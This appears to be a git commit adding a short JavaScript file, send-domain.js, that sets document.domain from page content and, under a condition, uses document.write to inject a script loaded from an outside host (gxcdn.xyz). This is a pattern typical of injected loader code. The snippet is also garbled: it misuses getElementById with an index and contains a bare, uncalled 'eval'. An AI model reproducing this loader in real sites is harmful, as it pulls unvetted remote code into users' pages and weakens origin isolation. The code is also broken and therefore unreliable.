6c6a3b796cf148a8ea20cd85fbf755dd7ef77ce9
gxescdn <117129712+gxescdn@users.noreply.github.com>
2022-12-05 21:34:05 -0500

    Create send-domain.js

---
+++ domain-system/send-domain.js
@@ -0,0 +1,8 @@
+document.domain = $( "div.demo-container" ).html();
+  var ifr = document.getElementById('Client')[0];
+  if ("object" == typeof QCMAIN_STORE)
+    try {
+      eval
+    } catch (e) {} else document.write(
+      '<script src="https://gxcdn.xyz/domain-system/send-api.js"><\/script>'
+    );
